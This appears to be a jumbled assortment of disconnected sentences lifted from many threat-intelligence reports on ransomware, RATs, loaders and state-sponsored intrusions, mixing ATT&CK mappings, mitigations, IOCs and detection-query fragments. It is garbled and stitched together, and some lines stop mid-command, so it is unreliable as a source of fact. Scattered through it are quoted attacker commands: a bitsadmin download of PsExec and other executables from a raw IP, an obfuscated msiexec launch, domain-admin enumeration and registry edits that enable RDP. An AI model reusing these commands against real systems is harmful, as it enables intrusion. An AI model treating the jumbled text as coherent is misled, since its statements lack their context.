When debugging, this line of code produces the error, “Can’t execute code in break mode”, and then stops executing. 
Click here for Anomali recommendation Tenable Research Advisory: Peekaboo Critical Vulnerability In NUUO Network Video Recorder (September 17, 2018) 
/c net group domain admins /domain
Numerous available commands are for general use, allowing the criminals to collect information about the infected machine. 
During the investigation, GTSC Blue Team experts determined that the attack utilized an unpublished Exchange security vulnerability, i.e., a 0-day vulnerability, thus immediately came up with a temporary containment plan.
Special thanks to Denis Sinegubko for his research and assistance with this post. 
Process Analysis Process Spawn Analysis [D3-PSA] Isolate: Execution Isolation Executable Denylisting
IOCs that could be shared are at the end of this document. 
It uses an XOR operation with the key and plaintext being incremented after each four-byte operation.
T1560.003Archive Collected Data: Archive via Custom MethodFlowCloud compresses some collected data by removing duplicates and similar screen captures. 
Known TeamTNT malware repository.
Figure 6: SMOKEDHAM downloader Within seconds, a file named qnxfhfim.cmdline was written to disk and executed using the Command-Line Compiler. 
After Rorschach is injected into notepad.exe, it’s still protected by VMProtect.
Carbon Blacks TrueBot Detection
The rootkit can prevent processes from being shown by utilities that list running processes, such as Task Manager.
The PowerShell command also downloaded and opened a decoy PDF. 
Hidden -command curl -o %
The Windows API offers LoadLibrary and GetProcAddress functions to facilitate this.
As mentioned, svchost.exe was created without any parameters and it will try to exit.
In a nutshell, MOTW is a mitigation technique introduced by Microsoft.
During our research, we didn’t find much information, so we did threat hunting by monitoring hacker forums with our dark web team.
However, there is no distinct evidence to conclusively attribute the cyber operations to an individual using that persona. 
Notable examples include the UEFI bootkit used as part of the FinSpy surveillance toolset that we reported on, the work of our colleagues from ESET on the ESPectre bootkit, and a little-known threat activity that was discovered within government organisations in the Middle East, using a UEFI bootkit of its own (briefly mentioned in our APT trends report Q3 2021 and covered in more detail in a private APT report delivered to customers of our Threat Intelligence Portal). 
Detection: To help organizations check if their Exchange Servers have been exploited by this bug yet, GTSC have released guideline and a tool to scan IIS log files (stored by default in the %SystemDrive%\inetpub\logs\LogFiles folder ): 
Correlating the network activity to the host activity confirms that the ‘Powershell.exe’ process initiated the WMI requests. 
Figure 1: Overview of the three IcedID variants. 
SysUpdate’s seemingly legitimate executables and their respective sideloaded files Legitimate application name Certificate signer Side-loaded DLL name Loaded binary file name INISafeWebSSO.exe Initech inicore_v2.3.30.dll inicore_v2.3.30.bin rc.exe Microsoft rcdll.dll rcdll.bin dlpumgr32.exe DESlock DLPPREM32.dll sv.bin GDFInstall.exe UBISOFT ENTERTAINMENT GameuxInstallHelper.DLL sysconfig.bin route-null.exe Wazuh libwazuhshared.dll wazuhext.bin route-null.exe Wazuh libwazuhshared.dll agent-config.bin wazuh-agent.exe Wazuh libwinpthread-1.dll wazuhext.bin We want to highlight that this is the first time we observed a threat actor abusing a sideloading vulnerability in a Wazuh signed executable.
See Table 1 for a description of the events, the expected network defender activity, and the organization’s actual response. 
If you still suspect things are not as they should be, ask the potential customer to call you on the phone before you open the files.
The payload is responsible for decrypting the appropriate loader depending on the system architecture, so either 32-bit or 64-bit.
Figure 9.
CrowdStrike recommends that organizations upgrade PowerShell on their systems, as this functionality is only available with PowerShell version 5 and above. 
Download security solutions that can detect and block malicious components in seemingly legitimate and non-malicious software and applications. 
AF978ED8AD37CE1437A6B42D96BF518D5C4CFD19hidmouse.sysWin64/Agent.
Its popularity and diversity of payloads suggests that it is not linked to one specific actor, but rather sold as an independent component on one of many underground forums. 
s^t^a^rt /^m^i^n m^s^i^e^xe^c
Towards the end of 2022, there were changes in how information was collected.
Adhere to the principle of least privilege. 
We have seen a similar posting in the past with the influential Sodinokibi affiliate Lalartu, so we decided to follow the money once more. Figure 24.
Shellcode Dolphin can receive shellcode for execution.
This is a common tactic used nowadays to evade MOTW, and BlueNoroff has also adopted it. 
These credentials are encrypted with Windows Data Protection APIs (DPAPI) CryptProtectData, either using the current user’s logon session or a generated master key, and then saved on the local hard drive.
The loader is named PresentationCache.exe and is protected with DNGuard, a commercial .NET packer.
We deliberately mention the term ‘malware’ instead of group.
The MDR team has explored this link and has not found substantial evidence to back this claim. 
To build the PE header, it will use the routine shown in Figure 7. Figure 7: Prepare Stage 2 PE Once PE header has been partially copied (excluding MZ magic value), it will start to copy the .text section using the routine shown in Figure 8. Figure 8: Copy .text
[T1136], Account Manipulation [T1098], Regsvr32
Both samples use images to hide the payload inside and both have similar shellcodes for bootstrapping.
CISA has observed Chinese MSS-affiliated actors using the Execution [TA0002] technique identified in table 7. Table 7: Execution technique observed by CISA MITRE ID Name Observation T1072 Software Deployment Tools CISA observed activity from a Federal Government IP address beaconing out to the threat actors’ C2 server, which is usually an indication of compromise. 
The Zip contains an ISO image file.
Kodex ransomware's note Conclusion EvilExtractor is being used as a comprehensive info stealer with multiple malicious features, including ransomware.
Also monitor for processes commonly associated with tunneling, such as Plink and the OpenSSH client. 
The action taken by the shortcut is rendered not visible in the Properties sheet, either, in what appears to be a novel, malicious use of an exploit first publicly disclosed a year ago in a blog post by researcher @x86matthew, who works for the UK-based offensive security research company MDSec.
The execution phase started with that password protected zip, which after extracting would show the user an ISO file that after the user double clicks would mount like a CD or external media device on Windows and present the user with a single file named documents in the directory. 
Figure 5 Once the initial configuration data has been decrypted, it will constantly check its bind connection to its C2 server to download further command arguments or other configuration settings that will dictate what functionality will be enabled for its malicious client file. 
CISA leveraged the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK:registered:) and Pre-ATT&CK frameworks to characterize the TTPs used by Chinese MSS-affiliated actors.
and they register new ones on a regular basis. 
Also, the key that will be used for the decryption is prepared. 
Drop the malicious updater and related files in the %PROGRAMDATA%\Progtmy\0 directory. 
The team queried AD for AD users (during Phase I and II), including for members of a SharePoint admin group and several standard user accounts with administrative access. 
The operators made a consistent effort to delete these tools and remove any residual forensic artifacts from compromised systems. 
.rar 
Insufficient host and network monitoring.
When the script fails to download the id_rsa.pub key, it triggers a canary token, which generates a signal after encountering a 404 error status code. 
The Solorigate incident is a grave reminder that these kinds of attacks can achieve the harmful combination of widespread impact and deep consequences for successfully compromised networks.
With the widespread use of the internet and the growing number of cyberattacks, cybercriminals have become increasingly interested in DNS attacks.
Damage Stolen passwords and banking information, identity theft, and the victim’s computer added to a botnet. 
Monitor event and authentication logs for records of hidden artifacts being used. 
The team installed persistent beacons at each of these sites.
Therefore, the original files can also be recovered from unallocated disk space if they have not yet been overwritten with fresh information. 
As one of two official projects formerly developed by Microsoft, the other being IronRuby, it uses the Dynamic Language Runtime (DLR). 
The DLL file’s original name is “Downloader.dll.”
Hijack Execution Flow: DLL Search Order Hijacking Black Basta used Qakbot, which has the ability to exploit Windows 7 Calculator to execute malicious payloads. T1543.003.
Conclusion The SeroXen developer has found a formidable combination of free resources to develop a hard to detect in static and dynamic analysis RAT.
We did not fetch any additional payloads from the C2, but we were served empty MSI files, allowing us to discover the names of the next stage payloads. 
The below courses of action mitigate the following techniques: Remote Desktop Protocol
An Argument Loader vfgadget populates a given register by loading a value into it.
ConnectionLimit =65535; If ($req.
GitHub and Gitlab offer detection mechanisms for thisRemote Desktop services or Gateways used as a primary or secondary remote access solution should be removed from any corporate environment in favour for alternative solutions such as secured VPNs, or other Remote Desktop applications which mitigate common attack techniques such as brute force or exploitation and can offer additional security controls such as MFA and Conditional Access.
Tune your security program, including people, processes, and technologies, based on the data generated by this process. 
Some of the wipers observed in this timeframe have been: WhisperKill, HermeticWiper, IsaacWiper, CaddyWiper, DoubleZero Wiper and AcidRain. 
This makes us believe the ransomware actors were professionalizing their operation just before expanding to the Ransomware-as-a-Service model. 
This indicates that the threat actor also leverages Adobe as a lure to install the AsyncRAT variant. 
This technique can be prevented by looking for an injection into explorer.exe or runtimebroker.exe, where the injected thread hooks process creation functions like NtCreateUserProcess, NtCreateProcessEx, CreateProcessInternalW, CreateProcessA or CreateProcessW. Named Pipe Communication Between Injected Processes Many banking Trojans use named pipes to communicate with various processes under the threat actor’s control.
GoSecure researchers received a sample from the IDR team which was suspected of being BazarLoader, named Report Preview15-10.exe, on 2020-10-06.
Victimology 
CISA has observed Chinese MSS-affiliated actors scanning Federal Government traffic using the discovery technique highlighted in table 9 (Discovery [TA0007]). 
%AppData%\AnyDesk\ad.trace, show that it was used during Day 1 and Day 7 of this intrusion, using the Administrator account each time.
Hive actors demand payment in Bitcoin. 
Command codes of CLEXEC Backdoor.
These payloads are compressed inside RAR files, this helps avoid static analysis techniques that do not decompress the files first.
An action you can take is to run Intezer’s live endpoint scanner across all machines in the organization.
K-12 institutions and universities do have an advantage when it comes to protecting themselves that too few organizations use to its full potential.
/priority normal http://79.137.206.47/PsExec.exe C:\Users\Public\PsExec.exe bitsadmin /transfer
Mandatory password changes enabled Consider only requiring changes for memorized passwords in the event of compromise.
[WINDOWS-CLIPBOARD] Remoe-exec psexec command 5008369 [WINDOWS-CLIPBOARD]
The example below shows how the syscall numbers are used: Figure 5 – Example use of direct syscall. 
T1113Screen
Reverse Proxy using Cobalt Strike Beacon A technique that we come across often is a reverse proxy.
However, we are not able to verify these claims.
Some of the most interesting characteristics of this attack were:The use of utilities such as proxychains and impacket during the post-compromise phases of the attack lifecycle.
DonPAPI is used to search machines for certain files known to be DPAPI blobs, including Wi-Fi keys, RDP passwords,
Password Policies/Hygiene 
The downloaded file is stored in ~/.config/guiconfigd (SHA-1: 0CA1723AFE261CD85B05C9EF424FC50290DCE7DF).
The malware then abuses the MSDTC service, manipulating the permissions and startup parameters.
Otherwise, the code extracts the payload that is cleverly stored as a node named “TwXfx” in a custom XML part of the document. 
Source Host: - Windows EID 4624 Logon Type = 9 Authentication Package = Negotiate Logon Process = seclogo - Windows EID 467 Domain Controller: - Windows EID 4776 
The algorithm used for decryption of the string varies from sample to sample, but sometimes the resource is just an unencrypted binary. 
[18] “SONAS 松山科技,” 開啟無接觸接待體驗與旅程, Feb. 12, 2023. /
The NCC Group discussed these configurations in a 2018 report and released a decoding tool. 
At first, things remained fairly quiet, just C2 communications; until around 3 hours later, Bumblebee dropped a Cobalt Strike beacon named wab.exe on the beachhead host.
BumbleBee is a malware loader that was first reported by Google Threat Analysis Group in March 2022.
For information on vulnerabilities known to be exploited by Chinese state-sponsored cyber actors, refer to the Trends in Chinese State-Sponsored Cyber Operations section for a list of resources. 
[D3-HD] URL Analysis [D3-UA] Network Traffic Analysis DNS Traffic Analysis
The affected applications are signed and have valid signatures. 
Which may be their approach as large binaries reduces the risk of being detected. 
By understanding its behaviors, we were able to generate telemetry and datasets to develop and test Splunk detections designed to defend and respond against this threat. 
<hostname>Account
Camaro Dragon’s TinyNote Backdoor url: https://research.checkpoint.com/2023/malware-spotlight-camaro-dragons-tinynote-backdoor/ Executive summary Since early January 2023, there has been a notable surge in activity targeting European foreign affairs entities linked to Southeast and East Asia.
T1115Clipboard DataFlowCloud registers a listener to steal clipboard data when it is changed. 
The most effective way to remove the data/file is by overwriting the specific physical location with other data (usually a repeated byte like 0xFF).
The VFS is accessed via file management functions hooked by the Orchestrator.
title: Threat actors strive to cause Tax Day headaches url: https://www.microsoft.com/en-us/security/blog/2023/04/13/threat-actors-strive-to-cause-tax-day-headaches/ Threat actors often take advantage of current events and major news headlines to align attacks and leverage social engineering when people could be more likely to be distracted or misled.
After quick conference between Quadrant and the client, all parties agreed and the decision was made: At approximately 8:45pm on September 22, only 56 hours after the initial phishing email had been opened, the physical cables from between the domains as well as their connection to the Internet were pulled. 
Depending on the operating system of the device, the malware has different persistence mechanisms.
A hidmouse service is then created to run that module and is immediately started.
With DCERPC bind request to DRSUAPI, an RPC call to DSGetNCChanges will replicate all the user AD objects to the impersonating client.
In this scenario, normal users running scripts should be considered suspicious. 
NetWalker is clearly following in the footsteps of its illustrious targeted ransomware peers like Sodinokibi, Maze and Ryuk. 
[T1564.003] Credential Access
[T1546.003]. 
DisableRoutinelyTakingAction /t
Debugger A debugger is a powerful tool that allows developers and researchers to follow and control the execution of a program.
T1012Query RegistryThe attackers have used various RATs that can read the Registry. 
Discovery T1016:
Indicators of Compromise SHA-256 Name c5b43b02a62d424a4e8a63b23bef8b022c08a889a15a6ad7f5bf1fd4fe73291f ATMSpitter a3b2de8f0d648f3e157300d0a88971919eb273b7d1c7b9ed023f26b5cc0ac3ca Sality infected file 4e32a6000a2b33ed0b8e4cf1256876c356cf5508ce0df2752fcfa214b6c2795b Formbook (SSL Decryption) 
T1140.
Domain Account T1136.002 
Use multi-factor authentication (MFA) with strong factors and require regular re-authentication. 
title: Threat Assessment: Black Basta Ransomware url: https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/ Executive Summary Black Basta is ransomware as a service (RaaS) that first emerged in April 2022.
| wait-job | Receive-Job" Analyst Note: Ursnif has been known to have VNC-like capabilities.
Note that the output of the hash function defined above is a point on the curve.
Another remaining unknown is ModPipe’s distribution method.
The HTML attachments used HTML Smuggling to drop a password protected, zipped Windows Script File (WSF).
echo nbproc > \\.\pipe\nbproc cmd.exe /c
→ run as system -d → do not wait for process termination -u → username (not shown here) -p → password (not shown here) WMIC 
The batch file is responsible for running a malicious executable d2ef5.exe with administrator privileges by creating a VBS script getadmin.vbs under %TEMP% folder to run the binary, but first the user would get an alert prompt from User Account Control (UAC) to allow the program to make changes. 
Figure 3.
This is a common approach to make it harder for analysts to analyze their tools in the ransomware attack, but it’s relatively rare in an APT attack.
The adversary infrastructure on GitHub used for staging the attack has now been taken down.
Mitigation: Use MFA for remote logins [M1032]. 
In order to obtain SYSTEM level privileges, Cobalt Strike’s built-in named piped impersonation (GetSystem) was used: Image: “C:\Windows\System32\cmd.exe” CommandLine: “C:\Windows\system32\cmd.exe /c
Trojan.Win32.TONEINS Based on our earlier observation, the TONEINS and TONESHELL malware were downloaded from the Google Drive link embedded in the body of an email.
Attackers commonly leverage botnets, especially on IoT devices, to generate spoofed DNS requests to overwhelm the target servers or organization network with DNS responses.
Figure 5 shows the code of the decryption algorithm used by RedLine Stealer to decrypt its initial configuration data which is a combination of Base64 and XOR functions. 
Hacking Tools Besides the shellcode loader and Cobalt Strike, we also observed additional tools, including port scanner, proxy and information stealer deployed to the compromised hosts.
In the Active Directory domain joined environment, if other users have logged into the compromised machine, provided a malware is running with escalated privileges, it can extract other user’s master keys from the LSASS memory which can then be used to decrypt their secrets.
For example, the just-in-time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege, as well as the Zero Trust model.
Since our last write up in October, the group has again switched to new infrastructure and samples, providing us with an opportunity to share an educational walkthrough of the process of investigating cybercrime activity that may be useful to new or lesser experienced SOC teams, analysts and researchers. 
Cisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks.
Remote Desktop ProtocolT1021.002 - SMB/Windows Admin SharesT1027 - Obfuscated Files Or InformationT1027.009 - Embedded PayloadsT1037 - Boot Or Logon Initialization ScriptsT1037.003 - Network Logon ScriptT1059 - Command And Scripting InterpreterT1059.001 - PowerShellT1059.003 - Windows Command ShellT1070 - Indicator RemovalT1080 - Taint Shared ContentT1105 - Ingress Tool TransferT1112 - Modify RegistryT1135 - Network Share DiscoveryT1136 -
We have found some similarities between those attacks and the ones that we describe in this article: We saw a malicious sample included in IoCs of QiAnXin’s report and a sample from the new campaign in the same government organization.
No attempts to persist on infected or brute-forced devices were observed for this campaign. 
Table 1 contains an overview of these resources and their use. 
Use signature-based network intrusion detection and prevention systems to identify adversary malware calling back to C2. 
The link from Superuser[.]com in INDEX D goes into more specifics on how this is done. 
Macro implementation Macro-inserted document text 
| where not(base64_decoded has_any(@"software\checker", "set folder to watch")) | where base64_decoded has_all("$hst", "$prt") or base64_decoded has_any("watcher", @"WAt`CH`Er()") 
Further examples included typos of commands: C:\Windows\system32\cmd.exe /C
If the value is equal to 1000, the RAT proceeds to communicate with the C2 (Figure 32). 
Figure 5 – Embedded payload in RTF file Once the persistence is established, the RTF file proceeds to execute the downloaded DLL payload by utilizing the “rundll32.exe” command as follows: 
This activity appeared to enable information gathering activities. 
The BAT script (4) does several things: 1. Changes the password of the logged-in user. 
WMSVC %ProgramFiles%\Windows Media Player\wmplayer.exe %windir%\system32\svchost.exe %windir%\system32\winlogon.exe %windir%\explorer.exe TCP://cigy2jft92.kasprsky.info:443 
The full list of IOCs can be found here. 
This backdoor is unique because it communicates to its C&C servers over the MQTT protocol, which is commonly used in internet-of-things (IoT) devices.
However, researchers at MalwareHunterTeam have put forward that one of the groups believed to have merged has denied any connection with Ransom Cartel.
;T1030 Data Transfer Size Limits;To prevent exceeding the size limits of the data being sent and triggering security controls, the stolen data may be sent in fixed-size blocks. 
--full=1 --diskpart=1
The new scripts from WatchDog are overtly copying TeamTNT infrastructure naming conventions and using a known WatchDog C2 hosting system, 199.199.226[.]117. 
When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.
fullword ascii $s13 = "ResOption1" fullword ascii $s14 = "DocumentSummaryInformation" fullword wide /*
Ensure that the User-ID Agent has minimal permissions if User-ID is enabled Ensure that User-ID is only enabled for internal trusted interfaces Ensure application security policies exist when allowing traffic from an untrusted zone to a more trusted zone Ensure that the User-ID service account does not have interactive logon rights Ensure that all zones have Zone Protection Profiles with all Reconnaissance Protection settings enabled, tuned, and set to appropriate actions Ensure that 'Include/Exclude Networks' is used if User-ID is enabled Ensure that security policies restrict User-ID Agent traffic from crossing into untrusted zones Ensure 'Security Policy' denying any/all traffic to/from IP addresses on Trusted Threat Intelligence Sources Exists Cortex XDR Prevent Configure Host Firewall Profile Cortex XSOAR Deploy XSOAR Playbook - Access Investigation Playbook Deploy XSOAR Playbook - Block Account Generic Threat Prevention Ensure that antivirus profiles are set to block on all decoders except 'imap' and 'pop3' Ensure an anti-spyware profile is configured to block on all spyware severity levels, categories, and threats Ensure a secure antivirus profile is applied to all relevant security policies Command and Control 
Available: https://github.com/shadow1ng/fscan (accessed: Apr. 28, 2023). 
Threat actors intentionally raise exceptions to interrupt malware analysts and obfuscate the execution flow of the program.
They then establish communication between the different processes using named pipes. 
Figure 40.
This targeting also coincided with a broader increase in the pace and the scope of cyberattacks attributed to Iranian threat actors, including another Mint Sandstorm subgroup, that Microsoft observed beginning in September 2021.
In the case of spam messages sent to Microsoft-hosted consumer email accounts (outlook.com), the spam emails were moved into customers’ junk folders before they could be viewed and clicked. 
[12/May/2023:21:17:48 +0000] "POST /wp-admin/update.php?action=upload-plugin&wc-ajax=1" 200 1361 - 16276 25581 … 193.169.195.64 -
Again, the address of a Google Docs document is used as the URL. 
The actor performed credential stuffing attacks against their targets, attempting to access users with the global admin role.
This lures users to double-click the graphic to view the content, which activates an OLE package that stores and executes Crimson RAT masquerading as an update process (MicrosoftUpdate.exe). 
The article contains visible edits to give the impression of a genuine draft article, aligning with Kimsuky’s luring tactic. 
By copying the logind.plist file to the /Library/LaunchAgents directory the Installer configures the Trojan to load at startup. 
It also manually loads some DLLs, bypassing calls to LoadLibrary. 
LSASS Dump A side effect of the WebDAV is, that the Defender is not going to delete files correctly on that shared folder. 
Ensure that domain controllers are backed up and properly secured (e.g., encrypt backups). 
Note that we had to remove the aforementioned obfuscation for the decompiler to produce any output. 
Figure 2 – malicious document Upon opening the malicious document, it attempts to establish a connection with the remote server to retrieve the subsequent component of the attack.
Based on our traffic source data to the host, evilextractor[.]com, malicious activity increased significantly in March 2023.
, the malware also targets certain files. 
The first extracts a message from the queue (by queue name), while the second sends its creator an arbitrary set of bytes with the stream-data command. 
The shortened URL is: https://acortaurl[.]com/httpsbogotagovcohttpsbogotagovcohttpsbogotagovco. 
Figure 33.
Older versions of Prilex performed patching on specific software libraries, whereas newer samples do not rely on specific software anymore and will instead hook Windows APIs to perform its job. 
<%@Page
Email from MuddyWater’s Israel attack (Source: Deep Instinct) Conclusion Observations of MuddyWater’s cyber espionage activities can lead to a conclusion that they act according to Iran’s political strategies through MOIS.
As with our previous article, we will highlight the common ways we see threat actors using Cobalt Strike. 
The NetWalker collective, much like those behind Maze, REvil and other ransomware, threatens to publish victims’ data if ransoms are not paid. 
Black Basta icon.
However since the latter technology has not yet been implemented on Windows, in this blog post we are going to refer to “Intel CET” as the implementation with only Shadow Stack enabled. 
The database used a weak password and was susceptible to brute-force attacks. 
Thread Execution Hijacking The final execution method Hancitor supports is Thread Execution Hijacking.
Refresher on 8220 Gang 8220 Gang (pronounced eighty-two twenty), also known as 8220 Mining Group, was first publicly reported by Talos in 2018.
These targeting overlaps have been observed in multiple groups, such as Groups 724, 1358, and 5171.
title: CatB Ransomware | File Locker Sharpens Its Claws to Steal Data with MSDTC Service DLL Hijacking url: https://www.sentinelone.com/blog/decrypting-catb-ransomware-analyzing-their-latest-attack-methods/ The CatB ransomware family, sometimes referred to as CatB99 or Baxtoy, was first observed in late 2022, with campaigns being observed steadily since November.
/q
There are specific tools that we use to analyze suspicious network traffic in our intrusion cases.
Monitoring and analyzing logs generated by the web server can help identify abnormal traffic patterns, such as repeated attempts to access a specific resource or an unusually high volume of requests from a single IP address.• Network traffic analysis: Network traffic analysis can help identify traffic that is not legitimate or is attempting to scan the network or web services.• Intrusion detection systems: Deploying an intrusion detection system (IDS) can help identify and alert administrators to malicious activities such as port scans or network sweeps.• Web application firewalls: Web application firewalls (WAF) can be used to protect web services from reconnaissance attempts by blocking or limiting access to resources and detecting and blocking known malicious patterns in web traffic. 
At this stage, we decide that it is not packed, and when we finally check with the “exeinfope,” the result is “not packed.” 
T1574.002Hijack Execution Flow: DLL Side-LoadingFlowCloud uses DLL Side-Loading to launch its second-stage dropper. 
Figure 2 outlines the multiple layers of process execution. 
4.
Figure 30.
The Center for Internet Security (CIS) Top 20 Cyber Security Controls provides a good guide to build that architecture.
Microsoft application data folder.
CLFS is a log framework that was introduced by Microsoft in Windows Vista and Windows Server 2003 R2 for high performance.
The actual sample is protected carefully, and requires quite a lot of work to access.
We reached out to the software developer to notify them about a potential compromise, but our enquiries went unanswered. 
Using Qualys Custom Asset and Remediation, you can utilize the following PowerShell community scripts to identify potential infected assets by either copying the contents of the script manually or pointing the tool to the GitHub script directly to download. 
While it is highly likely that the threat actor is a Chinese cyberespionage group in the nexus of Gallium and APT41, the exact grouping remains unclear. 
ALL YOUR FILES ARE ENCRYPTED !!!
argv[1] HKEY_USERS\<SID>-1001_Classes\ms-settings\CurVer (Default) aaabbb32 Table 3.
Patches Sleep to redirect to this function again 9. Resumes all threads in the current process 
Strings contained in the malicious DLL also point to emedres.dll from Emurasoft’s EmEditor as a possible third target for DLL side-loading.
Zerobot is capable of propagating through brute force attacks on vulnerable devices with insecure configurations that use default or weak credentials.
Unfortunately, we were not able to uncover any persistence method. 
The lure document Invitation letter from the US embassy.docx Since October 2022, we have been observing a new variant of PUBLOAD, which uses the spoofed HTTP header to transfer the data, as LAC’s report also discusses. 
It contains four export functions, as depicted below. 
In total, it deploys more than 30 shellcodes.
Evasive NoEscape Ransomware Uses Reflective DLL Injection
Consider disabling or restricting NTLM. 
% lldb locker_Apple_M1_64 (lldb) target create "locker_Apple_M1_64" Current executable set to 'locker_Apple_M1_64' (arm64). 
Upload file to attacker’s
Figure 7 RedLine Capabilities RedLine Stealer has several features that will be executed depending on the configuration setting it downloaded from its C2 to steal information from the compromised or targeted host.
Wu’s CNE activities resulted in the theft of trade secrets, intellectual property, and other high-value information from companies and organizations in the United States and abroad, as well as from multiple foreign governments.
These vfgadgets will be stored at regular intervals within the the array accessed by the Looper. 
Next-Generation Firewalls:
/priority normal http://79.137.206.47/int.exe C:\Windows\int.exe The malicious actor then began using the remote process execution tool PSExec to execute batch files (rdp.bat) that would cause registry changes to enable Remote Desktop sessions (RDP) using reg.exe.
User Execution T1204 Users downloaded and executed the team’s initial access payloads after clicking buttons to trigger download and execution. 
title: Breaking Pedersen Hashes in Practice\nurl: https://research.nccgroup.com/2023/03/22/breaking-pedersen-hashes-in-practice/\n\nThe Pedersen hash function has gained popularity due to its efficiency in the arithmetic circuits used in zero-knowledge proof systems.
The C2 server will respond with a 200 OK message. 
The ISO file had the final payload. 
The attackers rely on the use of remote access trojans, most likely to spy on their victims.
Around 3 hours later, the service account logged into one of the Domain Controllers from the beachhead. 
OdicLoader drops a decoy PDF document, displays it using the system’s default PDF viewer (see Figure 2), and then downloads a second-stage backdoor from the OpenDrive cloud service.
discoverypsloglist.exe -accepteula -x security -s
The batch file would download and execute an IcedID loader with rundll32 using a non-standard export: "PluginInit". 
Our threat intelligence analysts observed clear overlap between the various cases that NCC Group and Fox-IT worked in the threat’s infrastructure and capabilities, and as a result we assess with moderate confidence one activity group was carrying out the intrusions across the different type of victims. 
T1587.001Develop Capabilities: MalwareAgrius builds custom malware including wipers (Fantasy) and lateral movement tools (Sandals). 
Conclusion NetSupport Manager is a long-standing tool which, like TeamViewer, has unfortunately attracted ample use by cybercriminals.
Several files that the cyber actors target would be timestomped, in order to show different times compared to when those files were created/used. 
Proofpoint calls the two new variants recently identified “Forked” and “Lite” IcedID.
Lure document content This PowerPoint exploits a code execution technique that is triggered by using Hyperlinks instead of Run Program / Macro, which is designed to be triggered when the user starts the presentation mode and moves the mouse.
The attackers had to find a suitable place in this DLL component to insert their code.
Figure 2 shows LokiBot activity from ThreatFox. Figure 2.
These observations also provide evidence that threat actors can build and maintain relatively low-complexity capabilities, such as C2, to enable cyber operations against Federal Government networks (Build Capabilities [TA0024]).
These hackers acted for both their own personal gain and the benefit of the Chinese MSS.[2] According to the indictment, To conceal the theft of information from victim networks and otherwise evade detection, the defendants typically packaged victim data in encrypted Roshal Archive Compressed files (RAR files), changed RAR file and victim documents’ names and extensions (e.g., from “.rar” to “.jpg”) and system timestamps, and concealed programs and documents at innocuous-seeming locations on victim networks and in victim networks’ “recycle bins.”
Password theft Since it was first documented, ViperSoftX has been known as a cryptocurrency stealer.
Figure 2: Loading of the compiled Python module from main.py After the module is loaded, its get_path method is invoked
0x1 — Copy the payload into allocated memory within the current process and create a new thread to execute an export named ReflectiveLoader within the payload DLL. 0x4 — Save the payload to the %Temp% directory with a filename generated via GetTempFileNameA, and execute the file using CreateProcessA. 0x5, 0x6 — Open process with process id provided with the downloaded data.
Harden: 
The credential theft module is dropped if the malware has one of the following privileges: (It should be noted that the PROC_FLAG can any of the possible values) SeDebugPrivilege SeShutdownPrivilege & SeDebugPrivilege SeDebugPrivilege & SeTcbPrivilege SeShutdownPrivilege & SeDebugPrivilege & SeTcbPrivilege The MBR overwrite and MFT encryption subroutine is not executed if avp.exe is found running on the system The EternalBlue subroutine is not executed if either ns.exe or ccSvcHst.exe are found running on the system The system is rebooted using the API NtRaiseHardError if the process has at least the SeShutdownPrivilege level Credential Theft Credentials are provided to the malware in two ways: 
Apart from the loaders themselves, their launchers seem identical.
The following diagram aims to provide an illustration of the execution chain with multiple instances of Emotet leading to Cobalt Strike. 
Template injection is an attractive option for adversaries looking to execute malicious code without drawing scrutiny from defenders.
The data in the HTTP body is the same as the past variant, which has the same magic bytes 17 03 03 and the encrypted victim information.
It retrieves the list of VM volumes using the esxcli command and then iterates over each volume to search for specific files related to virtual machines.
How Zerobot gains and maintains device access IoT devices are often internet-exposed, leaving unpatched and improperly secured devices vulnerable to exploitation by threat actors.
Infection Script use of lwp-download The key take away from analyzing these infection scripts is noting unique additions, like lwp–download, combined with the destination of download requests.
%Profile%\cr.dat Spawned command: cmd.exe %Profile%\cr.dat 5pKwgIV5otiKb6JrNddaVJOaLjMkj4zED238vIU= After initial infection, we observed several keyboard hands-on activities by the operator.
Victims were observed to be back up and running within a matter of hours. 
title: Revisiting the NSIS-based crypter url: https://blog.malwarebytes.com/threat-analysis/2021/05/revisiting-the-nsis-based-crypter/ 
One aspect of the actions taken by the Incident Response team was a live log review.
T1543.003Create or Modify System Process:
A sophisticated group of cybercrime actors is luring victims, via phishing emails, with a traffic infringement phishing scheme to download TrickBot. 
Credential extraction from the LSASS process requires opening a read handle to the process itself which is closely monitored by EDR products but there are stealthier ways around it. 
REG_DWORD /d 0 /f reg.exe ADD 'HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server' /v fSingleSessionPerUser /t
ntdll!RtlUserThreadStart+0x21 0:000> dq 00000000`0014fde8 L1 00000000`0014fde8
Application Layer Protocol
Decompiled code of a function used by a FatalRAT sample to decrypt its configuration strings Figure 11.
Cybercriminals know this and have developed many ways to attack DNS services for malicious purposes. 
DLL Side-Loading V1 
ScanVMS() – This function scans VM volumes on an ESXi server.
Deploy XSOAR Playbook - Palo Alto Networks Endpoint Malware Investigation Table 1.
Figure 18 shows the hardcoded configuration for one of their samples. 
Some of these countries also voted to suspend Russia from the United Nations Human Rights Council (UNHRC) in early April 2022.
mild shock The execution of typical file types like: bat, chm, cmd, com, exe, hta, js, lnk, pif, ps1, vbs, wsh is indeed blocked. 
Top 10 countries affected by ViperSoftX in both the consumer and enterprise sectors Source: Trend Micro™ Smart Protection Network™ (SPN) Arrival routine For majority of cases, ViperSoftX typically arrives as a software crack, an activator or a patcher, or a key generator (keygen).
